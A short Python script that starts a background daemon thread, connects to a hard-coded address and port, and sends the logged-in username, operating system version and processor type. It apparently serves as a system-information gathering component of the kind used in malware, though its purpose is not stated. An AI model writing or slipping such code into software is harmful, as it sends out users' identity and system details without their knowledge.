import socket
import threading
import platform
from os import getlogin

gather_SOIP = "127.0.0.69"
gather_SOPORT = 42069

def startGathering():
    th = threading.Thread(target=Gathering)
    th.daemon=True
    th.start()

def Gathering():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((gather_SOIP, gather_SOPORT))
        sock.send(getlogin().encode('utf-8'))
        sock.send((platform.system() + platform.release()).encode("utf-8"))
        sock.send(platform.processor().encode("utf-8"))
        print("Finished")
        sock.close()
